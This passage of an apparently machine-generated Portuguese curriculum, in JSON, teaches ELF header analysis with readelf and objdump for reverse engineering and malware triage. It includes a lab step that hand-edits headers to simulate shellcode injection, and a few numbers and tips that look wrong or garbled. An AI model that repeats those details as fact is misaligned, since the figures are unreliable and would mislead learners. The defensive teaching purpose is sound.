                                    "Abra um terminal em um ambiente Linux.",
                                    "Obtenha um binário ELF exemplo, como `/bin/ls` ou compile um programa simples com `gcc hello.c -o hello`.",
                                    "Execute `readelf -h <arquivo.elf>` para exibir o ELF Header.",
                                    "Localize os campos `e_shoff` (offset da Section Header Table) e `e_shnum` (número de entradas na SHT).",
                                    "Anote os valores exatos de e_shoff e e_shnum."
                                  ],
                                  "verification": "Confirme que os valores de e_shoff e e_shnum foram anotados corretamente comparando com a saída do comando.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Ferramentas binutils (readelf)",
                                    "Binário ELF exemplo"
                                  ],
                                  "tips": "Use `readelf -h` em vez de objdump para detalhes precisos do header.",
                                  "learningObjective": "Identificar e interpretar os campos e_shoff e e_shnum no ELF Header.",
                                  "commonMistakes": "Confundir e_shoff com p_offset do Program Header ou ignorar endianness em sistemas big-endian."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Enumerar seções usando objdump -h",
                                  "subSteps": [
                                    "Execute `objdump -h <arquivo.elf>` para listar as headers de seção.",
                                    "Observe o número total de seções e compare com e_shnum.",
                                    "Identifique colunas: Idx, Name, Type, Address, Off (offset), Size, etc.",
                                    "Liste pelo menos 5 seções principais como .text, .data, .bss.",
                                    "Anote o offset da SHT (deve coincidir com e_shoff)."
                                  ],
                                  "verification": "A saída mostra exatamente e_shnum seções e o offset da SHT bate com e_shoff.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "objdump (binutils)",
                                    "Binário ELF"
                                  ],
                                  "tips": "O comando `-h` é shortcut para `--section-headers`; redirecione para arquivo para análise posterior.",
                                  "learningObjective": "Usar objdump para visualizar e enumerar a Section Header Table de forma resumida.",
                                  "commonMistakes": "Interpretar 'Off' como endereço virtual em vez de offset no arquivo; não verificar contagem de seções."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar SHT detalhada com readelf -S",
                                  "subSteps": [
                                    "Execute `readelf -S <arquivo.elf>` para saída detalhada da SHT.",
                                    "Compare o número de entradas com e_shnum e offset inicial com e_shoff.",
                                    "Para cada seção, note Nome, Type (ex: SHT_PROGBITS), Flags, Addr, Offset, Size.",
                                    "Identifique seções críticas: .text (código), .rodata (dados só-leitura), .symtab (símbolos).",
                                    "Use `xxd -s <e_shoff> -l 64 <arquivo.elf>` para inspecionar bytes iniciais da SHT."
                                  ],
                                  "verification": "Lista completa de seções com nomes, offsets e tamanhos corretos; bytes no e_shoff mostram estrutura sh_name, sh_type, etc.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "readelf",
                                    "xxd ou hexdump",
                                    "Binário ELF"
                                  ],
                                  "tips": "Combine com `readelf -S | grep .text` para filtrar seções específicas.",
                                  "learningObjective": "Interpretar a estrutura detalhada da Section Header Table e correlacionar com o arquivo binário.",
                                  "commonMistakes": "Ignorar flags de seção (ex: ALLOC, EXECINSTR) ou confundir offset de seção com e_shoff."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar e verificar seções no arquivo",
                                  "subSteps": [
                                    "Para uma seção como .text, use offset da saída objdump/readelf.",
                                    "Execute `xxd -s <offset_secao> -l <size_secao> <arquivo.elf>` para visualizar conteúdo.",
                                    "Confirme que e_shoff aponta para array de estruturas shdr (64 bytes cada em 64-bit).",
                                    "Crie um script simples para parsear e_shnum seções a partir de e_shoff.",
                                    "Teste em outro binário ELF para generalizar."
                                  ],
                                  "verification": "Conteúdo das seções visualizado corretamente e SHT parseada sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "xxd/hexdump",
                                    "Editor de texto para script opcional"
                                  ],
                                  "tips": "Em ELF 64-bit, cada entry SHT é 64 bytes; calcule fim da SHT como e_shoff + e_shnum*64.",
                                  "learningObjective": "Validar offsets da SHT acessando diretamente o arquivo binário.",
                                  "commonMistakes": "Offsets errados por confusão de 32/64-bit ou não alinhar a 8 bytes."
                                }
                              ],
                              "practicalExample": "Usando `/bin/ls` (ELF 64-bit): `readelf -h` mostra e_shoff=0x4f78, e_shnum=35. `objdump -h /bin/ls` lista 35 seções, com .text em Off=0x7400. `xxd -s 0x4f78 -l 128 /bin/ls` revela primeiras estruturas shdr.",
                              "finalVerifications": [
                                "e_shoff e e_shnum lidos corretamente do ELF Header.",
                                "Número de seções em objdump/readelf igual a e_shnum.",
                                "Offsets das seções principais (.text, .data) anotados com precisão.",
                                "Conteúdo da SHT verificado via hexdump no offset e_shoff.",
                                "Lista de 5+ seções com nome, offset e tipo correta."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de e_shoff/e_shnum (100% match).",
                                "Interpretação correta de pelo menos 80% das seções listadas.",
                                "Uso correto de ferramentas sem erros de sintaxe.",
                                "Capacidade de correlacionar offsets com conteúdo binário.",
                                "Explicação clara da estrutura SHT em relatório."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender carregamento de seções pelo linker/loader.",
                                "Linguagem Assembly: Localizar .text para desmontagem com objdump -d.",
                                "Engenharia Reversa: Base para análise estática de binários.",
                                "Programação em C: Manipular estruturas shdr manualmente com fopen/fread.",
                                "Criptografia: Inspecionar seções .dynamic para bibliotecas e símbolos."
                              ],
                              "realWorldApplication": "Em segurança computacional, analistas de malware usam essa técnica para mapear seções ELF em amostras maliciosas, identificando payloads em .data ou shellcode em .text, facilitando extração e análise forense em incidentes de ciberataques."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.2",
                            "name": "Analisar atributos de seções via Section Headers",
                            "description": "Interpretar sh_flags (SHF_WRITE, SHF_EXECINSTR), sh_size, sh_entsize e sh_link, correlacionando seções com segmentos de Program Headers para engenharia reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar a estrutura geral dos Section Headers no ELF",
                                  "subSteps": [
                                    "Localize a tabela de Section Headers no cabeçalho principal do ELF usando readelf -h ou objdump -h.",
                                    "Identifique os campos chave: sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size, sh_link, sh_info, sh_addralign, sh_entsize.",
                                    "Use readelf -S para exibir todos os Section Headers de um binário ELF de exemplo.",
                                    "Anote os offsets e tamanhos para entender a organização em disco e memória.",
                                    "Compare com a documentação ELF para validar os campos exibidos."
                                  ],
                                  "verification": "Confirme que você pode listar todos os Section Headers corretamente com readelf -S e identificar pelo menos 5 campos principais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Ferramenta readelf ou objdump, binário ELF simples (ex: gcc -o hello hello.c)",
                                  "tips": "Sempre use -W para largura completa em readelf para evitar truncamento de hex values.",
                                  "learningObjective": "Compreender a layout e propósito dos Section Headers como base para análise de atributos.",
                                  "commonMistakes": "Confundir Section Headers com Program Headers; ignorar endianness em valores hex."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar flags de seção (sh_flags): SHF_WRITE e SHF_EXECINSTR",
                                  "subSteps": [
                                    "Execute readelf -W -S binario.elf e foque na coluna FLAGS para cada seção.",
                                    "Decodifique SHF_WRITE (0x1): indica seção gravável (W).",
                                    "Decodifique SHF_EXECINSTR (0x4): indica seção executável (X).",
                                    "Combine com outros flags como SHF_ALLOC (0x2) para A (alocada em memória).",
                                    "Liste seções como .text (RX), .data (RW), .bss (RW) e anote seus flags em binário/hex."
                                  ],
                                  "verification": "Para um binário dado, classifique 3 seções como RWX corretamente (ex: .text é R/X).",
                                  "estimatedTime": "25 minutos",
                                  "materials": "readelf, objdump -h, binário ELF com múltiplas seções",
                                  "tips": "Use bitmasks: flags & 0x1 para WRITE, flags & 0x4 para EXEC; memorize 0x2=ALLOC, 0x20=MERGE.",
                                  "learningObjective": "Mapear sh_flags para permissões de memória (RWX) usadas em ASLR/DEP.",
                                  "commonMistakes": "Interpretar flags decimais em vez de hex/bin; ignorar flags compostos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar sh_size, sh_entsize e sh_link",
                                  "subSteps": [
                                    "Em readelf -S, examine sh_size: tamanho total da seção em bytes.",
                                    "Verifique sh_entsize: tamanho de cada entrada (ex: 16 bytes para symbol table entries).",
                                    "Analise sh_link: índice da seção ligada (ex: sh_link=1 aponta para .symtab se sh_type=SHT_SYMTAB).",
                                    "Calcule número de entradas: sh_size / sh_entsize para tabelas.",
                                    "Use readelf --section-headers-details para mais info."
                                  ],
                                  "verification": "Calcule corretamente entradas em .symtab (ex: 50 símbolos) e identifique seção ligada via sh_link.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "readelf com opções -S --section-headers-details, binário ELF estático/dinâmico",
                                  "tips": "sh_entsize=0 para seções não-tabulares; valide sh_link < e_shoff num de seções.",
                                  "learningObjective": "Entender relacionamentos entre seções e tamanhos para parsing eficiente.",
                                  "commonMistakes": "Dividir sh_size por sh_entsize sem verificar se sh_entsize>0; offsets errados em sh_link."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar Section Headers com Program Headers (segmentos)",
                                  "subSteps": [
                                    "Execute readelf -l para Program Headers (PT_LOAD, PT_DYNAMIC etc.).",
                                    "Mapeie seções para segmentos: procure sh_offset dentro p_offset/p_filesz de PT_LOAD.",
                                    "Agrupe seções por flags: .text+.rodata em PT_LOAD RX, .data em PT_LOAD RW.",
                                    "Use objdump -h -l para ver headers e seções alinhados.",
                                    "Desenhe um diagrama: disco (offsets) vs memória (vaddrs) mostrando mapeamento."
                                  ],
                                  "verification": "Crie tabela correlacionando 4 seções a 2 PT_LOAD segmentos com offsets/flags matching.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "readelf -l -S, objdump -h, papel/diagrama ferramenta como draw.io",
                                  "tips": "PT_LOAD define páginas mmap(); seções sem ALLOC não vão para segmentos.",
                                  "learningObjective": "Visualizar como seções granulares formam segmentos coarse-grained para execução.",
                                  "commonMistakes": "Ignorar alinhamentos (sh_addralign vs p_align); confundir sh_addr com p_vaddr."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Aplicar análise em contexto de engenharia reversa",
                                  "subSteps": [
                                    "Carregue binário em hex editor ou Ghidra/IDA para validar offsets de readelf.",
                                    "Identifique seções suspeitas: W+X para shellcode, grandes .bss para heap.",
                                    "Simule ROP: encontre gadgets em .text (X), dados em .data (W).",
                                    "Extraia strings/dinâmicos via sh_link para análise estática.",
                                    "Gere relatório: permissões, tamanhos, ligações para RE."
                                  ],
                                  "verification": "Gere relatório de 1 página identificando 3 vulnerabilidades potenciais baseadas em atributos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ghidra/IDA Free, hex editor (xxd/hexdump), binário malicioso simulado",
                                  "tips": "Procure SHF_WRITE+SHF_EXECINSTR para bypass DEP; use ptype para flags legíveis.",
                                  "learningObjective": "Usar atributos para priorizar alvos em RE e detecção de malware.",
                                  "commonMistakes": "Assumir todas seções alocadas; não validar com runtime (gdb info proc mappings)."
                                }
                              ],
                              "practicalExample": "Usando 'readelf -W -S /bin/ls', identifique .text (flags 0x6=AX, size~50KB), correlacione com PT_LOAD vaddr 0x401000 (RX), note sh_link de .dynsym=2 (.dynstr), calcule 100+ símbolos (sh_size/sh_entsize), detectando possível ROP em .text W+X ausente.",
                              "finalVerifications": [
                                "Classificar corretamente RWX de 5 seções principais via sh_flags.",
                                "Calcular entradas exatas em .symtab/.dynsym usando sh_size/sh_entsize.",
                                "Mapear todas seções a PT_LOAD corretos com offsets sobrepostos.",
                                "Identificar sh_link válido para 3 seções relacionais (.strtab, .rela etc.).",
                                "Gerar diagrama disco-memória sem erros de alinhamento.",
                                "Detectar anomalias RE como seções W+X em binário legítimo."
                              ],
                              "assessmentCriteria": [
                                "Precisão >95% em decodificação de flags (bitwise correto).",
                                "Cálculos exatos de tamanhos/entradas sem arredondamentos.",
                                "Mapeamento completo seção->segmento com evidência offsets.",
                                "Relatório RE identifica pelo menos 2 insights acionáveis.",
                                "Diagrama claro com labels RWX e tamanhos.",
                                "Explicação verbal fluida de sh_link em 1 min."
                              ],
                              "crossCurricularConnections": [
                                "Assembly/OS: Entender permissões mmap/protect em runtime.",
                                "Segurança: Detectar W^X violações para mitigações DEP/ASLR.",
                                "Programação C: Como gcc posiciona .data/.bss via linker scripts.",
                                "Redes: Análise de binários em forensics de malware.",
                                "Matemática: Operações bitwise para flags e alinhamentos."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, analise sh_flags para encontrar shellcode em seções W+X, mapeie .plt para hooks dinâmicos via sh_link, dimensione payloads em .data para exploits, essencial em CTFs como pwn.college ou análise de APTs em firmwares IoT."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.2.3",
                            "name": "Diferenciar Section Headers de Program Headers",
                            "description": "Comparar o foco granular das seções (para ferramentas de build) versus os segmentos coalescados dos Program Headers (para runtime), ilustrando com exemplos de stripping de seções em malwares.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura e Propósito dos Section Headers no ELF",
                                  "subSteps": [
                                    "Leia a documentação oficial do ELF (man elf ou ELF Specification) focando na tabela de Section Headers.",
                                    "Use o comando `readelf -S <binary>` em um binário ELF simples para visualizar as seções como .text, .data, .bss.",
                                    "Identifique campos chave: sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size.",
                                    "Anote como Section Headers são usados por ferramentas de build (linker, assembler) para manipulação granular.",
                                    "Compare com um binário stripped usando `readelf -S` para notar ausência."
                                  ],
                                  "verification": "Execute `readelf -S` e liste 5 seções com seus tipos e flags corretamente.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Binário ELF não stripped (ex: /bin/ls)",
                                    "readelf tool",
                                    "ELF man pages"
                                  ],
                                  "tips": "Comece com binários estáticos para clareza; use `file <binary>` para confirmar ELF.",
                                  "learningObjective": "Entender que Section Headers gerenciam seções individuais para linking e debugging.",
                                  "commonMistakes": [
                                    "Confundir sh_addr (virtual) com sh_offset (file)",
                                    "Ignorar que stripping remove esta tabela"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender a Estrutura e Propósito dos Program Headers no ELF",
                                  "subSteps": [
                                    "Estude a tabela de Program Headers na ELF spec, focando em tipos como PT_LOAD, PT_DYNAMIC, PT_INTERP.",
                                    "Execute `readelf -l <binary>` para listar Program Headers e seus campos: p_type, p_offset, p_vaddr, p_filesz, p_memsz.",
                                    "Observe como segmentos coalescem múltiplas seções (ex: PT_LOAD inclui .text + .rodata).",
                                    "Teste em um binário stripped: note que Program Headers persistem para runtime.",
                                    "Simule loading com `ldd` ou gdb para ver dependências via PT_DYNAMIC."
                                  ],
                                  "verification": "Liste 3 Program Headers comuns de um binário e explique seu papel no carregamento.",
                                  "estimatedTime": "45 minutes",
                                  "materials": [
                                    "Binário ELF (stripped e não)",
                                    "readelf",
                                    "gdb ou ldd"
                                  ],
                                  "tips": "Program Headers são 'mapas' para o kernel loader; foque em p_flags (R/W/X).",
                                  "learningObjective": "Reconhecer Program Headers como essenciais para execução runtime, coalescendo seções.",
                                  "commonMistakes": [
                                    "Achar que PT_LOAD é uma seção única",
                                    "Confundir p_filesz (arquivo) com p_memsz (memória)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Foco Granular dos Section Headers vs. Segmentos Coalescados dos Program Headers",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: propósitos (build vs. runtime), granularidade (seções vs. segmentos), impacto de stripping.",
                                    "Use `readelf -S -l` lado a lado em binários stripped/não para mapear seções a segmentos.",
                                    "Discuta cenários: linker usa sections, loader usa programs.",
                                    "Analise um binário com `objdump -h` para headers e confirme mapeamento.",
                                    "Explique por que malwares strip sections mas preservam programs."
                                  ],
                                  "verification": "Desenhe um diagrama mostrando 2 seções mapeadas a 1 segmento PT_LOAD.",
                                  "estimatedTime": "60 minutes",
                                  "materials": [
                                    "Binários ELF variados",
                                    "readelf, objdump",
                                    "Papel e caneta ou draw.io"
                                  ],
                                  "tips": "Lembre: sections = 'tijolos', programs = 'paredes'; stripping remove tijolos mas mantém paredes.",
                                  "learningObjective": "Diferenciar usos: granular (sections/build) vs. coalescado (programs/runtime).",
                                  "commonMistakes": [
                                    "Achar que são intercambiáveis",
                                    "Ignorar e_shstrndx para nomes de seções"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ilustrar com Exemplos de Stripping de Seções em Contextos de Malware",
                                  "subSteps": [
                                    "Baixe ou crie um binário ELF simples e strippe com `strip --strip-all`.",
                                    "Compare `readelf -S` antes/depois: sections gone, programs intact.",
                                    "Analise um sample de malware ELF (ex: de VirusTotal ou lab) com tools como `checksec` ou `readelf`.",
                                    "Demonstre ofuscação: sem sections, debugging/reverse mais difícil.",
                                    "Pratique detecção: use `readelf -h` para e_shnum==0 indicando stripped."
                                  ],
                                  "verification": "Analise um malware sample e explique como stripping afeta análise.",
                                  "estimatedTime": "75 minutes",
                                  "materials": [
                                    "strip tool",
                                    "Samples de malware ELF (VM isolada)",
                                    "readelf, checksec"
                                  ],
                                  "tips": "Sempre use VM sandbox para malwares; foque em e_shoff==0 pós-strip.",
                                  "learningObjective": "Aplicar diferenciação para detectar evasão em malwares via stripping.",
                                  "commonMistakes": [
                                    "Strippar programs (impossível)",
                                    "Executar malware fora de sandbox"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF malicioso 'malware.elf', `readelf -S` mostra e_shnum=0 (stripped sections), mas `readelf -l` revela PT_LOAD com .text coalescado. Isso permite execução mas complica análise estática, comum em droppers de ransomware.",
                              "finalVerifications": [
                                "Explique verbalmente a diferença de propósitos sem consultar notas.",
                                "Identifique corretamente sections vs. programs em output de readelf de um binário desconhecido.",
                                "Detecte stripping em 3 binários e justifique.",
                                "Mapeie seções .text/.data a um PT_LOAD em diagrama.",
                                "Discuta impacto em análise de malware com exemplo real."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de campos e propósitos (90% correto).",
                                "Capacidade de interpretar readelf outputs sem erros.",
                                "Diagrama comparativo claro e preciso.",
                                "Explicação contextualizada em segurança (malware stripping).",
                                "Identificação correta de stripped binários em testes.",
                                "Uso adequado de tools sem dependência excessiva."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Binários e Reverse Engineering: Uso de objdump/gdb.",
                                "Segurança de Malware: Detecção de ofuscação via stripping.",
                                "Sistemas Operacionais: Mecanismos de loading ELF pelo kernel.",
                                "Assembly e Linking: Processo de build com ld.",
                                "Forense Digital: Recuperação de artifacts em binários danificados."
                              ],
                              "realWorldApplication": "Em análise de malware, diferenciar permite detectar stripping (e_shnum=0), comum em APTs como ELF backdoors, facilitando triage: programs intactos confirmam executável, mas ausência de sections indica ofuscação para evasão de AVs."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.3.3",
                        "name": "Papel dos Headers na Análise e Carregamento de Executáveis ELF",
                        "description": "Integração dos Program e Section Headers na análise reversa e no processo de carregamento, permitindo detecção de anomalias como seções sobrepostas, headers manipulados ou injeções de código em contextos de exploração de vulnerabilidades.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.3.1",
                            "name": "Usar ferramentas para visualizar headers ELF",
                            "description": "Aplicar readelf -l (Program Headers), readelf -S (Section Headers) e objdump em binários ELF para extrair e validar estruturas, identificando discrepâncias em amostras maliciosas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e instalar ferramentas essenciais",
                                  "subSteps": [
                                    "Instale o binutils package em um sistema Linux (ex: sudo apt install binutils em Ubuntu/Debian).",
                                    "Verifique a instalação executando 'readelf --version' e 'objdump --version'.",
                                    "Baixe amostras de binários ELF benignos (ex: /bin/ls) e maliciosos de repositórios como VirusShare ou crie um com gcc.",
                                    "Configure um diretório de trabalho com pastas para amostras benignas e maliciosas.",
                                    "Familiarize-se com a sintaxe básica: man readelf e man objdump."
                                  ],
                                  "verification": "Confirme que readelf e objdump executam sem erros e liste os binários baixados com ls -la.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Sistema Linux, terminal, acesso à internet para binutils e amostras ELF.",
                                  "tips": "Use uma VM isolada para amostras maliciosas para evitar riscos de segurança.",
                                  "learningObjective": "Configurar ambiente pronto para análise de binários ELF.",
                                  "commonMistakes": "Esquecer de instalar binutils ou usar binários não-ELF (ex: PE no Linux)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Visualizar Program Headers com readelf -l",
                                  "subSteps": [
                                    "Execute 'readelf -l /bin/ls' em um binário benigno e analise a saída: identifique Type, Offset, VirtAddr, etc.",
                                    "Compare com documentação ELF: verifique se PT_LOAD, PT_INTERP e PT_DYNAMIC estão presentes e alinhados.",
                                    "Anote flags (ex: PF_X para executável) e tamanhos para validação.",
                                    "Repita em uma amostra maliciosa e busque offsets inválidos ou headers extras.",
                                    "Salve saídas em arquivos txt para comparação futura com diff."
                                  ],
                                  "verification": "Saída mostra headers padrão ELF com sem erros de parsing e anotações de 3+ discrepâncias em malicioso.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Binários ELF sample (benigno e malicioso), editor de texto.",
                                  "tips": "Use 'readelf -l -W' para saída wide se headers forem largos.",
                                  "learningObjective": "Interpretar e validar Program Headers para detectar manipulações.",
                                  "commonMistakes": "Confundir Program Headers com Section Headers; ignorar alinhamentos de memória."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Section Headers com readelf -S",
                                  "subSteps": [
                                    "Execute 'readelf -S /bin/ls' e identifique seções como .text, .data, .bss.",
                                    "Verifique atributos: Size, Addr, Flags (ex: ALLOC, EXECUTE) e alinhe com Program Headers.",
                                    "Procure seções suspeitas em maliciosos (ex: .overlay ou nomes não-padrão).",
                                    "Compare tamanhos totais de seções com PT_LOAD para consistência.",
                                    "Gere relatório resumindo mismatches."
                                  ],
                                  "verification": "Relatório lista seções chave e pelo menos 2 discrepâncias (ex: seção sem flags corretas).",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Mesmos binários, readelf.",
                                  "tips": "Filtre saída com grep 'Name' ou 'Flags' para foco.",
                                  "learningObjective": "Extrair e validar estruturas de seções ELF.",
                                  "commonMistakes": "Não notar seções sobrepostas ou tamanhos zero inválidos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar com objdump e integrar análises",
                                  "subSteps": [
                                    "Execute 'objdump -h /bin/ls' para headers de seção alternativos e compare com readelf.",
                                    "Use 'objdump -f' para info geral e 'objdump -p' para dynamic section.",
                                    "Combine saídas: cruze PT_LOAD offsets com seções para mapear memória.",
                                    "Em malicioso, identifique packing/obfuscation via headers anormais.",
                                    "Crie script bash simples para automatizar readelf -l/-S e objdump -h."
                                  ],
                                  "verification": "Script gera relatório integrado destacando 3+ discrepâncias em malicioso vs benigno.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Binários, editor para script bash.",
                                  "tips": "Objdump é mais legível para disassembly; use -M intel para sintaxe familiar.",
                                  "learningObjective": "Usar objdump complementando readelf para análise holística.",
                                  "commonMistakes": "Não alinhar saídas de ferramentas diferentes; overload de opções."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Identificar e relatar discrepâncias em amostras maliciosas",
                                  "subSteps": [
                                    "Compile lista de indicadores: headers truncados, offsets inválidos, seções não-mapeadas.",
                                    "Analise 2-3 maliciosos: documente evidências com screenshots/saídas.",
                                    "Valide com hexdump -C em offsets suspeitos.",
                                    "Crie relatório final com tabelas comparativas.",
                                    "Teste conhecimento reproduzindo em novo binário."
                                  ],
                                  "verification": "Relatório completo com tabela de discrepâncias e validação via hexdump.",
                                  "estimatedTime": "35 minutos",
                                  "materials": "Hexdump, múltiplas amostras maliciosas.",
                                  "tips": "Procure PT_NOTE ou PT_GNU_STACK incomuns em malwares.",
                                  "learningObjective": "Detectar anomalias ELF indicativas de malware.",
                                  "commonMistakes": "Atribuir falsos positivos sem cross-validação com múltiplas ferramentas."
                                }
                              ],
                              "practicalExample": "Analise /bin/ls (benigno): readelf -l mostra PT_LOAD padrão em 0x400000. Em um ELF packer malicioso (ex: UPX), PT_LOAD offsets não alinham com seções, revelando compressão via discrepâncias em readelf -S e objdump -h.",
                              "finalVerifications": [
                                "Executa readelf -l/-S e objdump sem erros em 5+ binários.",
                                "Lista corretamente 4+ Program Headers padrão e suas funções.",
                                "Identifica 3+ discrepâncias em amostra maliciosa (ex: offset inválido).",
                                "Gera relatório comparativo com diff ou tabela.",
                                "Script bash automatiza análise básica.",
                                "Valida com hexdump em pontos chave."
                              ],
                              "assessmentCriteria": [
                                "Precisão na interpretação de headers (90%+ match com specs ELF).",
                                "Detecção consistente de anomalias em maliciosos (mín. 80%).",
                                "Relatórios claros com evidências visuais/tabulares.",
                                "Uso eficiente de subSteps e verificações em cada análise.",
                                "Integração correta entre readelf e objdump.",
                                "Tempo total dentro de 2.5 horas com qualidade alta."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Entender carregamento ELF pelo linker dinâmico.",
                                "Assembly/Reversing: Mapear headers para disassembly com objdump -d.",
                                "Criptografia: Detectar seções obfuscadas em malwares.",
                                "Programação em C: Compilar binários customizados para testes.",
                                "Forense Digital: Análise de evidências em investigações cibernéticas."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting/RE, analistas usam essas ferramentas para desempacotar malwares ELF em ataques Linux/IoT, identificando C2 servers via headers manipulados ou injetando payloads em firmwares comprometidos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.2",
                            "name": "Detectar manipulações em headers para análise de malware",
                            "description": "Identificar alterações como PT_LOAD com flags inválidas ou seções .text com SHF_WRITE ativado, simulando cenários de buffer overflow e shellcode injection baseados em Practical Malware Analysis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Padrão dos Headers e Seções ELF",
                                  "subSteps": [
                                    "Estude a especificação ELF para Program Headers (p_headers) e Section Headers (s_headers)",
                                    "Use a ferramenta readelf -l e readelf -S em um binário ELF benigno para visualizar estruturas",
                                    "Identifique PT_LOAD típico com flags PF_R (read), PF_W (write), PF_X (execute) e suas combinações normais",
                                    "Analise seções como .text, que deve ter flags SHF_ALLOC | SHF_EXECINSTR (sem SHF_WRITE)",
                                    "Registre alinhamentos e tamanhos esperados para headers"
                                  ],
                                  "verification": "Liste corretamente as flags padrão para PT_LOAD e .text usando readelf em um binário limpo",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta readelf (parte do binutils)",
                                    "Especificação ELF (elfformat.pdf)",
                                    "Binário ELF benigno como /bin/ls"
                                  ],
                                  "tips": "Sempre execute readelf com opções -l (program headers) e -S (section headers) para comparações lado a lado",
                                  "learningObjective": "Dominar configurações normais de headers ELF para baseline de detecção de anomalias",
                                  "commonMistakes": [
                                    "Confundir Program Headers com Section Headers",
                                    "Ignorar flags de proteção de memória como NX bit",
                                    "Não verificar alinhamentos de offset que indicam packing"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Flags e Atributos Manipulados Comuns",
                                  "subSteps": [
                                    "Procure PT_LOAD com flags inválidas, como PF_W + PF_X simultaneamente (W^X violation)",
                                    "Verifique seções .text ou .plt com SHF_WRITE ativado, indicando possível injeção de shellcode",
                                    "Use objdump -h para dump de headers e grep por flags anômalas como 'WRITE, EXEC'",
                                    "Compare offsets e virtual addresses para overlaps suspeitos entre seções de dados e código",
                                    "Documente anomalias em um relatório simples com saídas de ferramentas"
                                  ],
                                  "verification": "Identifique e explique pelo menos duas manipulações em um ELF modificado artificialmente",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "readelf e objdump",
                                    "Editor de hex como xxd ou HxD",
                                    "ELF benigno para modificação manual"
                                  ],
                                  "tips": "Use scripts awk ou grep para automatizar buscas por flags: 'readelf -l file | grep \"Flags:.*W.*X\"'",
                                  "learningObjective": "Reconhecer padrões de manipulação em headers que facilitam exploits como buffer overflow",
                                  "commonMistakes": [
                                    "Focar apenas em nomes de seções sem verificar flags",
                                    "Não considerar arquiteturas (x86 vs ARM)",
                                    "Interpretar falsos positivos de bibliotecas dinâmicas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Cenários de Malware com Buffer Overflow e Shellcode Injection",
                                  "subSteps": [
                                    "Crie um ELF modificado adicionando SHF_WRITE à .text via editor hex ou radare2",
                                    "Simule buffer overflow alterando PT_LOAD para permitir escrita em região executável",
                                    "Execute análise estática com radare2 ou Ghidra para visualizar injeções de shellcode",
                                    "Teste carregamento com ld-linux.so para observar falhas ou comportamentos maliciosos em sandbox",
                                    "Registre evidências como disassembly mostrando código injetado"
                                  ],
                                  "verification": "Gere um relatório com prints de readelf antes/depois da manipulação e análise do impacto",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "radare2 ou Ghidra para RE",
                                    "Sandbox como Cuckoo ou VM isolada",
                                    "Editor hex",
                                    "Exemplos de Practical Malware Analysis Lab 10-1"
                                  ],
                                  "learningObjective": "Aplicar conhecimentos para simular e detectar vetores de ataque reais em ELF",
                                  "commonMistakes": [
                                    "Executar malware fora de sandbox",
                                    "Não validar mudanças com 'readelf -l' pós-modificação",
                                    "Ignorar ASLR/DEP em simulações"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
